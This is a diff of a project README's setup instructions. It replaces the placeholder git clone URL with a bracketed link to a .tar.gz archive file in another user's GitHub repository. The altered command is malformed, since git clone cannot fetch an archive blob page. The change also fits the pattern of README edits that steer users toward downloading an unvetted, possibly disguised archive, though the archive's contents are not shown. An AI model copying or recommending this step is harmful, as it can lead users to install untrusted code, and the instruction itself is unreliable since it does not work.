@@ -77,7 +77,7 @@ dependencies:
 
 1. Clone the repository
 ```bash
-git clone https://github.com/yourusername/book_library.git
+git clone [https://github.com/S1l1c1um/Books/blob/main/code/book_library_app.tar.gz]
 cd book_library
 ```
 
